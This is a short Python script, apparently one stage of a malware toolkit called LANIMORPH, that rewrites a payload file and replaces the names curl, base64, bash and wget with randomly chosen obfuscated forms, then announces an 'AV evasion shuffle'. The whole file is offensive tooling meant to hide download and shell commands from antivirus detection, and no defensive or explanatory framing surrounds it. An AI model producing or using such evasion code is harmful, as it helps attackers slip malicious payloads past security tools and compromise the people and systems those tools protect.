#!/usr/bin/env python3
import os, random

f = os.path.expanduser("~/LANIMORPH/chain/mutated_payload.py")
if not os.path.exists(f): exit()

with open(f) as src:
    code = src.read()

replacements = {
    "curl": random.choice(["cu_rl", "c\\url", "$(echo cURL)"]),
    "base64": random.choice(["b@se64", "b_a_s_e64", "$(echo YmFzZTY0 | base64 -d)"]),
    "bash": random.choice(["b\\ash", "$(command -v bash)", "b@$h"]),
    "wget": random.choice(["w_get", "$(echo d2dldA== | base64 -d)", "w#g#e#t"])
}

for k, v in replacements.items():
    code = code.replace(k, v)

with open(f, "w") as out:
    out.write(code)

print("[✓] AV evasion shuffle complete.")
